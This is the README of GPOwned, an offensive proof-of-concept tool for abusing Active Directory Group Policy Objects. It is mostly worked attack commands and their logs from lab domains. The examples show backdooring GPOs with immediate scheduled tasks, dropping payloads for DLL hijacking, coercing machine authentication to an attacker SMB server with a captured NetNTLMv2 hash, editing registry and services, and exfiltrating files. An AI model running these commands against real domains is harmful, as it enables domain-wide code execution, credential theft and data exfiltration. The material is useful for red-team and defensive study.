# GPOwned

**/!\\ This is a buggy PoC I made just to play with GPOs in my lab. Be careful! You probably need to edit the code! /!\\**

The script uses `impacket` and `ldap3` to update the GPOs. It implements enough primitives that can be combined (just need to perform minor changes in the code) to achieve different ways of code execution (DLL hijacking, COM junctions, shortcut poisoning, etc.)

# Usage

```
psyconauta@insulanova:~/Research/GPOwned|⇒  python3 GPOwned.py -h
		GPO Helper - @TheXC3LL


usage: GPOwned.py [-h] [-u USERNAME] [-p PASSWORD] [-d DOMAIN] [-hashes [LMHASH]:NTHASH] [-dc-ip ip address] [-listgpo] [-displayname display name] [-name GPO name] [-listgplink] [-ou GPO name] [-gpocopyfile] [-gpomkdir] [-gporegcreate] [-gposervice] [-gpoexfilfiles]
                  [-gpoimmtask] [-gpoimmuser User for ImmTask] [-srcpath Source file] [-dstpath Destination path] [-hive Registry Hive] [-type Type] [-key Registry key] [-subkey Registry subkey] [-default] [-value Registry value] [-service Target service]
                  [-action Service action] [-author Task Author] [-taskname Task Name] [-taskdescription Task description] [-gpcuser] [-gpcmachine] [-gpoupdatever] [-usercontext] [-backup Backup location]

GPO Helper - @TheXC3LL

optional arguments:
  -h, --help            show this help message and exit
  -u USERNAME, --username USERNAME
                        valid username
  -p PASSWORD, --password PASSWORD
                        valid password (if omitted, it will be asked unless -no-pass)
  -d DOMAIN, --domain DOMAIN
                        valid domain name
  -hashes [LMHASH]:NTHASH
                        NT/LM hashes (LM hash can be empty)
  -dc-ip ip address     IP Address of the domain controller
  -listgpo              Retrieve GPOs info using LDAP
  -displayname display name
                        Filter using the given displayName [only with -listgpo]
  -name GPO name        Filter using the GPO name ({Hex})
  -listgplink           Retrieve the objects the GPO is linked to
  -ou GPO name          Filter using the ou [only with -listgplinks]
  -gpocopyfile          Edit the target GPO to copy a file to the target location
  -gpomkdir             Edit the target GPO to create a new folder
  -gporegcreate         Edit the target GPO to create a registry key/subkey
  -gposervice           Edit the target GPO to start/stop/restart a service
  -gpoexfilfiles        Edit the target GPO to exfil a file (* to all) to the target location
  -gpoimmtask           Edit the target GPO to add a Immediate Task
  -gpoimmuser User for ImmTask
                        User to run the immediate task
  -srcpath Source file  Local file path
  -dstpath Destination path
                        Destination path
  -hive Registry Hive   Registry Hive
  -type Type            Type of value
  -key Registry key     Registry key
  -subkey Registry subkey
                        Registry subkey
  -default              Sets new value es default
  -value Registry value
                        Registry value
  -service Target service
                        Target service to be started/stopped/restarted
  -action Service action
                        Posible values: start, stop & restart
  -author Task Author   Author for Scheduled Task
  -taskname Task Name   Name for the Scheduled Task
  -taskdescription Task description
                        Description for the scheduled task
  -gpcuser              GPO is related to users
  -gpcmachine           GPO is related to machines
  -gpoupdatever         Update GPO version (GPT.INI file and LDAP object)
  -usercontext          Execute the GPO in the context of the user
  -backup Backup location
                        Location of backup folder
psyconauta@insulanova:~/Research/GPOwned|⇒  



```

# Examples

## List GPOs
```
syconauta@insulanova:~/Research/GPOwned|⇒  python3 GPOwned.py -u eddard.stark -p 'FightP3aceAndHonor!' -d sevenkingdoms.local -dc-ip 192.168.56.10 -gpcmachine -listgpo
		GPO Helper - @TheXC3LL


[*] Connecting to LDAP service at 192.168.56.10
[*] Requesting GPOs info from LDAP

[+] Name: {31B2F340-016D-11D2-945F-00C04FB984F9}
	[-] displayName: Default Domain Policy
	[-] gPCFileSysPath: \\sevenkingdoms.local\sysvol\sevenkingdoms.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}
	[-] gPCMachineExtensionNames: [{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]
	[-] versionNumber: 3
	[-] Verbose: 
		---		---
		Security
		Computer Restricted Groups

[+] Name: {6AC1786C-016F-11D2-945F-00C04fB984F9}
	[-] displayName: Default Domain Controllers Policy
	[-] gPCFileSysPath: \\sevenkingdoms.local\sysvol\sevenkingdoms.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}
	[-] gPCMachineExtensionNames: [{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]
	[-] versionNumber: 1
	[-] Verbose: 
		---		---
		Security
		Computer Restricted Groups

[^] Have a nice day!

```

## Backup
If you are going to backdoor a GPO, it's good to save a backup so you can perform a rollback :P

```
psyconauta@insulanova:~/Research/GPOwned|⇒  python3 GPOwned.py -u eddard.stark -p 'FightP3aceAndHonor!' -d sevenkingdoms.local -dc-ip 192.168.56.10 -gpcmachine -backup /tmp/test01 -name "{31B2F340-016D-11D2-945F-00C04FB984F9}"
		GPO Helper - @TheXC3LL


[*] Creating backup folder
[*] Connecting to LDAP service at 192.168.56.10
[*] Requesting GPOs info from LDAP
[*] Saving gPCMachineExtensionNames values as gPCMachineExtensionNames.txt
[*] Connecting to SMB service at 192.168.56.10
[*] Enumerating files at \SysVol\sevenkingdoms.local\policies\{31b2f340-016d-11d2-945f-00c04fb984f9}
[*] Downloading \Sysvol\sevenkingdoms.local\policies\{31b2f340-016d-11d2-945f-00c04fb984f9}/GPT.INI
[*] Enumerating files at \SysVol\sevenkingdoms.local\policies\{31b2f340-016d-11d2-945f-00c04fb984f9}/MACHINE
[*] Enumerating files at \SysVol\sevenkingdoms.local\policies\{31b2f340-016d-11d2-945f-00c04fb984f9}/MACHINE/Microsoft
[*] Enumerating files at \SysVol\sevenkingdoms.local\policies\{31b2f340-016d-11d2-945f-00c04fb984f9}/MACHINE/Microsoft/Windows NT
[*] Enumerating files at \SysVol\sevenkingdoms.local\policies\{31b2f340-016d-11d2-945f-00c04fb984f9}/MACHINE/Microsoft/Windows NT/SecEdit
[*] Downloading \Sysvol\sevenkingdoms.local\policies\{31b2f340-016d-11d2-945f-00c04fb984f9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf
[*] Enumerating files at \SysVol\sevenkingdoms.local\policies\{31b2f340-016d-11d2-945f-00c04fb984f9}/USER

[^] Have a nice day!
psyconauta@insulanova:~/Research/GPOwned|⇒  tree /tmp/test01                                                                                                                                                                      
/tmp/test01
├── gPCMachineExtensionNames.txt
├── GPT.INI
├── MACHINE
│   └── Microsoft
│       └── Windows NT
│           └── SecEdit
│               └── GptTmpl.inf
└── USER

5 directories, 3 files
```

## Update GPO version
Helper for rollback
```
psyconauta@insulanova:~/Research/GPOwned|⇒  python3 GPOwned.py -u eddard.stark -p 'FightP3aceAndHonor!' -d sevenkingdoms.local -dc-ip 192.168.56.10 -gpcmachine -gpoupdatever -name "{31B2F340-016D-11D2-945F-00C04FB984F9}"      
		GPO Helper - @TheXC3LL


[*] Connecting to LDAP service at 192.168.56.10
[*] Requesting {31B2F340-016D-11D2-945F-00C04FB984F9} version and location from LDAP
[*] Updating from version [3] to [4]
[*] Connecting to SMB service at 192.168.56.10
[*] Reading \sevenkingdoms.local\policies\{31b2f340-016d-11d2-945f-00c04fb984f9}\gpt.ini 
[*] Writing \sevenkingdoms.local\policies\{31b2f340-016d-11d2-945f-00c04fb984f9}\gpt.ini
[+] Version updated succesfully!

[^] Have a nice day!

```
## Immediate Tasks
Probably the most exploited way to obtain code execution is via Immediate Task, so here we can do the same:

```
python3 GPOwned.py -u avispa.marina -p Password.1234 -d zoo.local -dc-ip 10.0.2.15 -gpcmachine -gpoimmtask -name '{1A5FC7E3-ACBA-4CB3-96B2-2F6568127784}' -author 'ZOO\Administrador' -taskname 'Beautiful IOC' -taskdescription 'Hello World' -dstpath 'c:\windows\system32
otepad.exe'
		GPO Helper - @TheXC3LL


[*] Connecting to LDAP service at 10.0.2.15
[*] Requesting GPOs info from LDAP
[*] Connecting to SMB service at 10.0.2.15
[*] Reading \ZOO.LOCAL\Policies\{1A5FC7E3-ACBA-4CB3-96B2-2F6568127784}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml 
[*] Writing \ZOO.LOCAL\Policies\{1A5FC7E3-ACBA-4CB3-96B2-2F6568127784}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
[*] Updating gPCMachineExtensionNames
[*] Requesting {1A5FC7E3-ACBA-4CB3-96B2-2F6568127784} version and location from LDAP
[*] Updating from version [114] to [115]
[*] Reading \ZOO.LOCAL\Policies\{1A5FC7E3-ACBA-4CB3-96B2-2F6568127784}\GPT.INI 
[*] Writing \ZOO.LOCAL\Policies\{1A5FC7E3-ACBA-4CB3-96B2-2F6568127784}\GPT.INI
[+] Version updated succesfully!

[^] Have a nice day!
```

You can use `smbclient`to upload your .exe/.bat/whatever to SysVol or just edit the script to move your local payload to the target machine using the `GPOCopyFile()`

## Copy Files
You can copy a local file to SysVol and use the GPO to copy from there to a interesting location in the target machine. This can be useful to drop your payloads there, or to peform a DLL hijack directly for example. You can edit the code to combine this with other primitives.

```
python3 GPOwned.py -u avispa.marina -p Password.1234 -d zoo.local -dc-ip 10.0.2.15 -gpocopyfile -name '{1B5C9CCF-CDE7-4D57-891F-EAE1F804669A}' -srcpath /tmp/alive.txt -dstpath '%SystemDir%\other_file_again.pwned'
		GPO Helper - @TheXC3LL


[*] Connecting to LDAP service at 10.0.2.15
[*] Requesting GPOs info from LDAP
[*] Connecting to SMB service at 10.0.2.15
[*] Uploading /tmp/alive.txt to \ZOO.LOCAL\Policies\{1B5C9CCF-CDE7-4D57-891F-EAE1F804669A}\Machine\other_file_again.pwned
[*] Reading \ZOO.LOCAL\Policies\{1B5C9CCF-CDE7-4D57-891F-EAE1F804669A}\Machine\Preferences\Files\Files.xml 
[*] Writing \ZOO.LOCAL\Policies\{1B5C9CCF-CDE7-4D57-891F-EAE1F804669A}\Machine\Preferences\Files\Files.xml
[*] Updating gPCMachineExtensionNames
[*] Requesting {1B5C9CCF-CDE7-4D57-891F-EAE1F804669A} version and location from LDAP
[*] Updating from version [32] to [33]
[*] Reading \ZOO.LOCAL\Policies\{1B5C9CCF-CDE7-4D57-891F-EAE1F804669A}\GPT.INI 
[*] Writing \ZOO.LOCAL\Policies\{1B5C9CCF-CDE7-4D57-891F-EAE1F804669A}\GPT.INI
[+] Version updated succesfully!

[^] Have a nice day!
```


Also it can be used to coerce auth:

```
python3 GPOwned.py -u avispa.marina -p Password.1234 -d zoo.local -dc-ip 10.0.2.15 -gpcmachine -gpocopyfile -name '{1B5C9CCF-CDE7-4D57-891F-EAE1F804669A}' -srcpath '\10.0.2.6\pwned' -dstpath '%SystemDir%\other_file_again.pwned'
		GPO Helper - @TheXC3LL


[*] Connecting to LDAP service at 10.0.2.15
[*] Requesting GPOs info from LDAP
[*] Connecting to SMB service at 10.0.2.15
[*] Reading \ZOO.LOCAL\Policies\{1B5C9CCF-CDE7-4D57-891F-EAE1F804669A}\Machine\Preferences\Files\Files.xml 
[*] Writing \ZOO.LOCAL\Policies\{1B5C9CCF-CDE7-4D57-891F-EAE1F804669A}\Machine\Preferences\Files\Files.xml
[*] Updating gPCMachineExtensionNames
[*] Requesting {1B5C9CCF-CDE7-4D57-891F-EAE1F804669A} version and location from LDAP
[*] Updating from version [38] to [39]
[*] Reading \ZOO.LOCAL\Policies\{1B5C9CCF-CDE7-4D57-891F-EAE1F804669A}\GPT.INI 
[*] Writing \ZOO.LOCAL\Policies\{1B5C9CCF-CDE7-4D57-891F-EAE1F804669A}\GPT.INI
[+] Version updated succesfully!

[^] Have a nice day!

(...)

➜  ~ sudo python3 /usr/local/bin/smbserver.py test /tmp -smb2support -debug
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[+] Impacket Library Installation Path: /usr/local/lib/python3.6/dist-packages/impacket
[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.0.2.7,51009)
[*] AUTHENTICATE_MESSAGE (ZOO\PACIFICO$,PACIFICO)
[*] User PACIFICO\PACIFICO$ authenticated successfully
[*]
PACIFICO$::ZOO:4141414141414141:dffe816765d06820d72b7a34a7e4def8:01010000000000000023f9c0d5cdd70193c7053ce980ad7700000000010010007900630064004c006100710061004500030010007900630064004c0061007100610045000200100079004e0058006e0051004900460079000400100079004e0058006e005100490046007900070008000023f9c0d5cdd70106000400020000000800300030000000000000000000000000400000538a61082d471fdb0486a7fa0a3cccbc55809bfdaf1fa4b4151b472dd549141c0a0010000000000000000000000000000000000009001a0063006900660073002f00310030002e0030002e0032002e0036000000000000000000
[*] Handle: 'ConnectionResetError' object is not subscriptable
[*] Closing down connection (10.0.2.7,51009)
[*] Remaining connections []
```

## Create Folders

The same than file creation this can be combined with other primitives editing the script

```
python3 GPOwned.py -u avispa.marina -p Password.1234 -d zoo.local -dc-ip 10.0.2.15 -gpcmachine -gpomkdir -name '{1B5C9CCF-CDE7-4D57-891F-EAE1F804669A}' -dstpath '%SystemDir%\Adepts_of_0xcc'
		GPO Helper - @TheXC3LL


[*] Connecting to LDAP service at 10.0.2.15
[*] Requesting GPOs info from LDAP
[*] Connecting to SMB service at 10.0.2.15
[*] Reading \ZOO.LOCAL\Policies\{1B5C9CCF-CDE7-4D57-891F-EAE1F804669A}\Machine\Preferences\Folders\Folders.xml 
[*] Writing \ZOO.LOCAL\Policies\{1B5C9CCF-CDE7-4D57-891F-EAE1F804669A}\Machine\Preferences\Folders\Folders.xml
[*] Updating gPCMachineExtensionNames
[*] Requesting {1B5C9CCF-CDE7-4D57-891F-EAE1F804669A} version and location from LDAP
[*] Updating from version [39] to [40]
[*] Reading \ZOO.LOCAL\Policies\{1B5C9CCF-CDE7-4D57-891F-EAE1F804669A}\GPT.INI 
[*] Writing \ZOO.LOCAL\Policies\{1B5C9CCF-CDE7-4D57-891F-EAE1F804669A}\GPT.INI
[+] Version updated succesfully!

[^] Have a nice day!
```

## Create registry key

The script can be edited to update/delete keys instead of creating a new one
```
python3 GPOwned.py -u avispa.marina -p Password.1234 -d zoo.local -dc-ip 10.0.2.15 -gpcmachine -gporegcreate -name '{1B5C9CCF-CDE7-4D57-891F-EAE1F804669A}' -hive HKEY_LOCAL_MACHINE -key 'SOFTWARE\Microsoftlabla'  -type REG_SZ -value 'whatever'
		GPO Helper - @TheXC3LL


[*] Connecting to LDAP service at 10.0.2.15
[*] Requesting GPOs info from LDAP
[*] Connecting to SMB service at 10.0.2.15
[*] Reading \ZOO.LOCAL\Policies\{1B5C9CCF-CDE7-4D57-891F-EAE1F804669A}\Machine\Preferences\Registry\Registry.xml 
[*] Writing \ZOO.LOCAL\Policies\{1B5C9CCF-CDE7-4D57-891F-EAE1F804669A}\Machine\Preferences\Registry\Registry.xml
[*] Updating gPCMachineExtensionNames
[*] Requesting {1B5C9CCF-CDE7-4D57-891F-EAE1F804669A} version and location from LDAP
[*] Updating from version [40] to [41]
[*] Reading \ZOO.LOCAL\Policies\{1B5C9CCF-CDE7-4D57-891F-EAE1F804669A}\GPT.INI 
[*] Writing \ZOO.LOCAL\Policies\{1B5C9CCF-CDE7-4D57-891F-EAE1F804669A}\GPT.INI
[+] Version updated succesfully!

[^] Have a nice day!
```

## Start/Stop/Restart services

```
python3 GPOwned.py -u avispa.marina -p Password.1234 -d zoo.local -dc-ip 10.0.2.15 -gpcmachine -gposervice -name '{1A5FC7E3-ACBA-4CB3-96B2-2F6568127784}' -service Netman -action restart
		GPO Helper - @TheXC3LL


[*] Connecting to LDAP service at 10.0.2.15
[*] Requesting GPOs info from LDAP
[*] Connecting to SMB service at 10.0.2.15
[*] Reading \ZOO.LOCAL\Policies\{1A5FC7E3-ACBA-4CB3-96B2-2F6568127784}\Machine\Preferences\Services\Services.xml 
[*] Writing \ZOO.LOCAL\Policies\{1A5FC7E3-ACBA-4CB3-96B2-2F6568127784}\Machine\Preferences\Services\Services.xml
[*] Updating gPCMachineExtensionNames
[*] Requesting {1A5FC7E3-ACBA-4CB3-96B2-2F6568127784} version and location from LDAP
[*] Updating from version [115] to [116]
[*] Reading \ZOO.LOCAL\Policies\{1A5FC7E3-ACBA-4CB3-96B2-2F6568127784}\GPT.INI 
[*] Writing \ZOO.LOCAL\Policies\{1A5FC7E3-ACBA-4CB3-96B2-2F6568127784}\GPT.INI
[+] Version updated succesfully!

[^] Have a nice day!
```

## Exfiltrate files
Copy remote files to a known location (a network share, for example). It admits wildcards (*) but no recursion.

```
psyconauta@insulanova:~/Research/GPOwned|⇒  python3 GPOwned.py -u eddard.stark -p 'FightP3aceAndHonor!' -d sevenkingdoms.local -dc-ip 192.168.56.10 -gpcmachine -gpoexfilfile -name '{949B21C5-9257-4E0E-8090-D8F8CD1DA4AA}'  -srcpath 'c:\boot.ini' -dstpath '%SystemDir%\other_file_again.pwned'                                                                                                                  
		GPO Helper - @TheXC3LL


[*] Connecting to LDAP service at 192.168.56.10
[*] Requesting GPOs info from LDAP
[*] Connecting to SMB service at 192.168.56.10
[*] Writing \sevenkingdoms.local\policies\{949b21c5-9257-4e0e-8090-d8f8cd1da4aa}\Machine\Preferences\Files\Files.xml
[*] Updating gPCMachineExtensionNames
[*] Requesting {949B21C5-9257-4E0E-8090-D8F8CD1DA4AA} version and location from LDAP
[*] Updating from version [11] to [12]
[*] Reading \sevenkingdoms.local\policies\{949b21c5-9257-4e0e-8090-d8f8cd1da4aa}\gpt.ini 
[*] Writing \sevenkingdoms.local\policies\{949b21c5-9257-4e0e-8090-d8f8cd1da4aa}\gpt.ini
[+] Version updated succesfully!

[^] Have a nice day!
```
